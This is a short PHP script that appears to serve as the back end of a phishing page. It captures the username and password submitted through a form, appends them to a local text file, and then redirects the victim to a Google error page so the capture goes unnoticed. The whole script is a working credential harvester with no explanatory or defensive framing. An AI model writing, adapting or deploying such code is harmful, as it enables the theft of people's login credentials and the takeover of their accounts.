<?php

file_put_contents("usernames.txt", "Custom Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.google.com/404');
exit();
?>